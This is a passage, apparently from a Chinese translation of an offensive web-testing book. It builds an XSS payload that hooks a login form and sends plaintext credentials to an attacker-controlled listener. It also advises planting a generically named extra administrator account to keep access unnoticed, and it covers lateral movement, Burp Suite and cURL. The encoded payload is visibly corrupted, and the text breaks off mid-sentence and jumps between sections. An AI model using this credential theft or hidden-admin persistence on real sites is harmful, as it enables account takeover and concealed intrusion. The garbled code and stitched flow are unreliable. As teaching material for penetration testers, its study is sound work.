
# 图 3.19 使用message参数成功执行XSS

很好！根据图 3.19，看起来XSS正在正常执行。但让我们现在考虑一下我们所处的位置以及此页面上可以访问什么。检查文档对象模型（DOM）显示我们可以访问用于提交用户名和密码的表单，如图 3.20所示。如果我们同时劫持该表单，并强制它也向自己提交，会发生什么？这甚至可能吗？

![](img/181571ad74cba0e6a2f38fcd2658651e_82_0.png)

# 图 3.20 识别此页面的输入字段，我们可以访问存储在这些字段中的值

为了找出答案，我们需要首先确定实现这一点所需的合法JavaScript代码。让我们打开开发者控制台（通常是F12或右键点击并选择“在控制台中打开”）。从这里，我们可以访问一个与DOM交互的JavaScript实例，如图 3.21所示。让我们尝试访问表单，看看能否从中收集信息。请密切关注字段的`id`，这是我们以编程方式访问其中存储信息的方式。例如，我们输入用户名的框具有`username`的ID。

![](img/181571ad74cba0e6a2f38fcd2658651e_83_0.png)

# 图 3.21 访问页面上的交互式JavaScript控制台

打开开发者控制台后，我们可以看到可以通过控制台交互式地访问DOM。将鼠标悬停在页面的各个部分上，会显示正在使用的各个div的名称。我们可以通过用JS解析这些字段中的信息，直接访问其中的内容。一旦证明了我们可以访问数据，我们就确信能够从登录尝试中窃取信息。

让我们在不提交的情况下向这些字段中放入一些数据，然后确定如何用JavaScript检索它们。要访问字段中存储的信息，我们可以通过JavaScript获取字段的属性。例如，对于`username`字段，我们可以请求`username.value`属性，它将显示存储在用户名字段中的文本。此外，我们还可以通过请求`password`对象的`password.value`值来获取明文密码！即使密码在网页上以隐藏字符表示，我们仍然可以通过JS访问明文密码。如图3.22所示，我们可以看到存储在字段中的密码。

![](img/181571ad74cba0e6a2f38fcd2658651e_84_0.png)

# 图 3.22 使用JavaScript动态访问存储在用户名和密码字段中的值。可以访问明文密码

现在我们需要一点创造力——想象一下，将XSS漏洞武器化到这样的程度：用户只需点击他们组织网站的链接，恶意JS就会在用户登录其应用程序时窃取明文凭据。相当疯狂，对吧？

这是完全可能的，因为我们可以简单地添加另一个JS操作，向我们控制的服务器发送任意的POST请求，然后继续用户正常登录的过程。从用户的角度来看，与正常登录机器没有区别。然而，从我们这边来看，我们会在服务器上收到一个POST请求，其中包含用户提交时的凭据。太酷了！

让我们继续分阶段构建我们的武器化漏洞利用。既然我们知道可以从用户名和密码字段收集数据，我们需要确保这些数据可以通过POST请求发送给我们。最简单的方法是使用AJAX（异步JavaScript和XML）。AJAX听起来复杂，但实际上比看起来简单得多——它只是异步活动，帮助我们的页面看起来更流畅，并且无需重新加载整个页面即可加载/发送请求。想象一下浏览Facebook或Reddit，每次加载一组新帖子时，整个页面不会重新加载——这是由于AJAX调用收集更多帖子的缘故。

我们可以使用下面的代码创建AJAX请求。这段代码旨在找到DOM中的`form`选择器，然后监听提交事件。在不执行默认操作的情况下，我们将让它向一个我们控制的端点发送AJAX请求。在此示例中，它将是在localhost上我们通过nc连接监听的另一个端口。

要在浏览器中执行代码，我们需要确保使用`eval`函数调用它。发起攻击时，我们使用`eval`而不是`console.log`，`eval`会将函数中的字符串作为代码执行。

```javascript
eval(atob('Y29u3C9qZgm9ybSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImZycm0iKTsgZm
9yb5ShZGRmdVudExp3R1bmVyKCJzdW5taXQiLCBmdW5jdGlvbihilmdVdkF5bldYdC5
wcmV2ZW50RGVmYXVsdCgpPyBXYXIgZgYID0gbmV3IFNhdmVxIGhvb3BxbXZFZXF1NOKCk7IHhoci5v
cGVuKCJHRVQiLCBCgaHR0cDovL2xvY2FsaG9zdDo4MDMgbXgLyR7dXNlcm5hbWUdFsdWV9OiR7c
GFzc3dvcmQmdFsdWV9Yck7IHhoc15zZW5kKCk7fSk7'))
```

现在让我们测试我们的漏洞利用。如果一切正常，我们会冲出受影响的错误横幅，开始使用`<script>`标记调用JavaScript，运行`atob()`函数来解码我们创建的武器化漏洞利用，然后解码后的漏洞利用会到达用户名和密码字段，当用户点击“提交”按钮时通过POST发送。图 3.24显示了我们窃取此密码的过程，相当酷，对吧？

![](img/181571ad74cba0e6a2f38fcd2658651e_86_0.png)

# 图 3.24 利用消息参数中的XSS在登录页面窃取登录时的明文密码

## 利用环节

现在我们有了一个有效且高效的漏洞利用，我们必须找到发起攻击的方法。不恰当的时机可能会迅速摧毁我们到目前为止识别和武器化漏洞的工作——我们必须格外小心，不要在时机成熟之前暴露自己的底牌。

互联网上有许多不同类型的Web开发人员创建应用程序。对于许多人来说，他们手工创建应用程序，一旦能运行，就不频繁检查应用程序是否正常运行。即使没有用户报告错误，他们也可能审查错误日志。然而，根据本作者的经验，对于大多数Web开发人员来说，一旦应用程序

![](img/181571ad74cba0e6a2f38fcd2658651e_88_0.png)

# 图 3.25 成功认证到 Web 应用并访问某个实用工具

获得这些管理凭据后，我们必须记住要针对新获得的访问权限进行侦察，并将其整合到我们已有的目标情报档案中。这些新信息将带来我们可能以前没有的额外访问途径。其中之一是`文件读取实用程序`，它似乎允许我们读取系统上的文件，如图 3.25 所示。这是另一个我们稍后将调查的代码异味。

在管理功能中，我们优先创建新的额外管理员，这样即使我们已利用的用户更改了密码，我们仍然能够访问。查看现有用户，我们可以看到有许多“名字”和一个`admin`。我们不应重置/更改`admin`密码，因为这可能会让产品所有者注意到隐藏的问题。相反，我们可以创建一个新的管理员级用户，但将其命名为非常通用的名称，例如`Administrator`或`backup`。这些通用名称通常不够描述性，足以混入现有用户列表而不引起怀疑。

## 横向移动

一旦我们确信即使立足点被移除、撤销或重置，我们的访问权限仍能保持，我们就可以专注于攻击其他可能受互联网保护的系统。请记住，基于云的系统通常托管在 VPC 中，VPC 可能有权访问那些无法直接访问互联网的敏感机器。较老的公司可能仍然运行 DMZ，这可以提供对公司网络的访问。

大部分横向移动活动可以在特权提升章节以及利用与反向外壳章节中进行描述。获得对该初始机器的根级访问权限显著地

安装 Burp 后，打开应用程序并选择“临时项目”。这是社区版的限制，社区版无法保存测试活动以便稍后再次访问。点击`下一步`按钮。

![](img/181571ad74cba0e6a2f38fcd2658651e_90_0.png)

# 图 3.27 打开 Burp Suite 后启动临时项目

选择`使用 Burp 默认设置`，然后点击`启动 Burp`按钮以打开测试套件。此时也可以提供配置文件，常见的配置是从漏洞赏金项目中加载，这些配置管理哪些项目处于范围内。

![](img/181571ad74cba0e6a2f38fcd2658651e_90_1.png)

# 图 3.28 启动临时项目后启动 Burp Suite

Burp 窗口打开后，我们会看到几个不同的工具使用选项。请注意窗口左下角的`事件日志`显示代理服务已启动，以及服务的位置。该代理允许我们从其他非 Burp 工具发送流量到 Burp，并查看发生的活动。在此截图中，我们可以看到代理运行在 `127.0.0.1` 的 `localhost` 和 `8080` 端口上。请注意，尽管 Burp 主要与预配置的浏览器或将 Firefox 指向代理一起使用，但我们也可以将其他基于 CLI 的工具通过 Burp 代理发送。这让我们有机会在 Burp 的历史记录中查看其他工具发出的请求。

![](img/181571ad74cba0e6a2f38fcd2658651e_91_0.png)

# 图 3.29 代理服务运行在 localhost 的 8080 端口上，允许其他非 Burp 程序使用该代理，以便 Burp 对其进行分析

既然我们知道 Burp 窗口已打开并正在运行代理，我们就可以开始将流量推送过去。Burp 自带一个预配置的浏览器，该浏览器使用已建立的 Burp 代理，从而减少了开始使用所需的步骤。要使用此浏览器，请点击`代理`选项卡，然后点击`拦截`选项卡，并点击`打开浏览器`。这将打开一个 Chromium 浏览器供我们使用。

![](img/181571ad74cba0e6a2f38fcd2658651e_92_0.png)

# 图 3.30 打开 Burp 预配置的 Chromium 浏览器。点击 (1) 代理，(2) 拦截，(3) 打开浏览器

![](img/181571ad74cba0e6a2f38fcd2658651e_92_1.png)

# 图 3.31 内置且预配置的 Burp Chromium 浏览器

打开 Chromium 浏览器后，我们通过代理进行的任何活动都会显示并汇集在 Burp 中，以便我们进一步分析。请注意，在首次打开 Burp 时，默认情况下`拦截是开启的`。这意味着*我们进行的任何网络活动都会被 Burp 代理捕获，并等待进一步发送*。启用拦截后，当所有请求离开浏览器时，我们都必须手动批准。这会减慢测试速度，并妨碍我们在整个应用中进行适当的侦察。

![](img/181571ad74cba0e6a2f38fcd2658651e_93_0.png)

# 图 3.32 Burp 的拦截功能截住一个请求，等待手动操作

点击`转发`按钮会将请求发送到浏览器确定的目标端点。不过，我们也可以在发送前修改请求。修改请求是执行本章所描述的一些测试的非常有用的技术。点击`转发`按钮后，请求将被发送到目标网站，并返回响应。我们可以通过查看浏览器并获得结果来确认已收到响应。

![](img/181571ad74cba0e6a2f38fcd2658651e_93_1.png)

# 图 3.33 经由 Burp 代理后从目标网站接收响应

回到 Burp 窗口，我们可以查看浏览网站以来发生的所有活动。这可以通过点击`代理`选项卡，然后点击`HTTP 历史`选项卡来实现。

生成的窗口显示通过代理发出的 HTTP 请求，以及它们收到的响应类型、方法、长度、收到的文件类型和参数。点击此窗口中的某个项目，还会显示浏览器发送和接收的完整 HTTP 请求和响应。

![](img/181571ad74cba0e6a2f38fcd2658651e_94_0.png)

# 图 3.34 在 Burp 中查看 HTTP 历史，并审查相应的 HTTP 请求和响应

此外，我们可以利用一些内置的 Burp 工具来增强测试。发现了你想向它发送另一个请求，但需要快速修改的内容？当然要使用`重放器（Repeater）`！可以通过右键点击任何请求，然后点击`发送到重放器`来访问它。另外，按 `Control + R` 键也可以做到这一点。

![](img/181571ad74cba0e6a2f38fcd2658651e_94_1.png)

# 图 3.35 将 HTTP 历史中的请求发送到 Repeater

点击`重放器`选项卡将打开重放器工具，我们可以在此修改请求并随时重新发送。这对于快速测试特定参数或配置，以及判断是否存在更深层次的漏洞非常有效。HTTP 请求的每个部分都可以修改，包括自定义 HTTP 方法。在下面的截图中，我们将 HTTP 方法从 `GET` 修改为非标准的 `JUMP`，这不在 HTTP RFC 规范中。正如预期的那样，我们从网站收到一个错误响应，指示该方法未实现。

![](img/181571ad74cba0e6a2f38fcd2658651e_95_0.png)

# 图 3.36 使用 Burp Repeater 更改 HTTP 方法，导致服务器返回错误

这些操作仅仅触及了如何利用 Burp 的皮毛，但请放心，这是互联网上可用的最有效的 Web 安全测试工具之一。任何新的网络安全分析师都应学好如何有效使用这个工具来提供价值。可以在 PortSwigger 学院获取关于 Burp Suite 的更深入的学习内容，地址为 [https://portswigger.net/web-security](https://portswigger.net/web-security)，那里提供了各种学习材料和实验环境。

使用 Burp 收集到的信息提供了有价值的洞察，帮助我们了解浏览器上发生了什么活动，以及它如何与网站通信，还有潜在漏洞可能存在于哪些地方。

## cURL

统一资源定位符客户端（cURL）是一个命令行程序，允许用户直接从命令行发送 HTTP 和 HTTPS 请求。`cURL` 的真正魔力在于，它可以以编程方式有效地访问网站的不同部分。我们还可以执行一些操作，例如向应用程序发送带有数据的 POST 请求来与之交互。

要使用 cURL，请打开命令提示符并输入 `curl -h` 以确定它是否已安装。如果已安装，它将显示该工具的帮助信息。通读帮助信息，以了解更多关于如何使用 `cURL` 的内容。

```text
(kali㉿kali)-[~]
└─$ curl -h
Usage: curl [options...] <url>
     -d, --data <data>              HTTP POST data
     -f, --fail                     Fail fast with no output on HTTP errors
     -h, --help <category>           Get help for commands
     -i, --include                   Include protocol response headers in the output
     -o, --output <file>             Write to file instead of stdout
     -O, --remote-name               Write output to a file named as the remote file
     -s, --silent                    Silent mode
     -T, --upload-file <file>        Transfer local FILE to destination
     -u, --user <user:password>       Server user and password
     -A, --user-agent <name>         Send User-Agent <name> to server
     -v, --verbose                   Make the operation more talkative
     -V, --version                   Show version number and quit

This is not the full help, this menu is stripped into categories.
Use "--help category" to get an overview of all categories.
For all options use the manual or "--help all".
```

# 图 3.37 cURL 的帮助信息

要向网站发出一个简单的请求，我们可以将网站放在命令中。例如，要向 [m4lwhere.org](http://m4lwhere.org) 发起 Web 请求，命令 `curl m4lwhere.org` 就会发送该请求。注意，当我们在域名前不提供协议时，cURL 默认使用 HTTP 而非 HTTPS。这可以从响应中识别出来，因为响应中包含一个重定向到 HTTPS 服务的跳转。

```html
(kali㉿kali)-[~]
└─$ curl m4lwhere.org
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://m4lwhere.org/">here</a>.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at m4lwhere.org Port 80</address>
</body></html>
```

# 图 3.38 使用 cURL 发送请求而不指定协议时，默认使用 HTTP
